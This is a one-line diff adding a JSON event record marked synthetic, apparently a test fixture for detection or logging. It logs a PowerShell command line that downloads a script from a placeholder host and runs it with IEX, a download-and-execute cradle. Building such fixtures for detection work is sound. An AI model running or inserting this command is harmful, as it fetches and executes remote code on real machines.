@@ -1,0 +1,1 @@
+{"schema_version":1,"synthetic":true,"event":{"FileName":"powershell.exe","ProcessCommandLine":"powershell.exe -NoProfile -Command IEX (New-Object Net.WebClient).DownloadString('https://example.invalid/synthetic.ps1')"}}
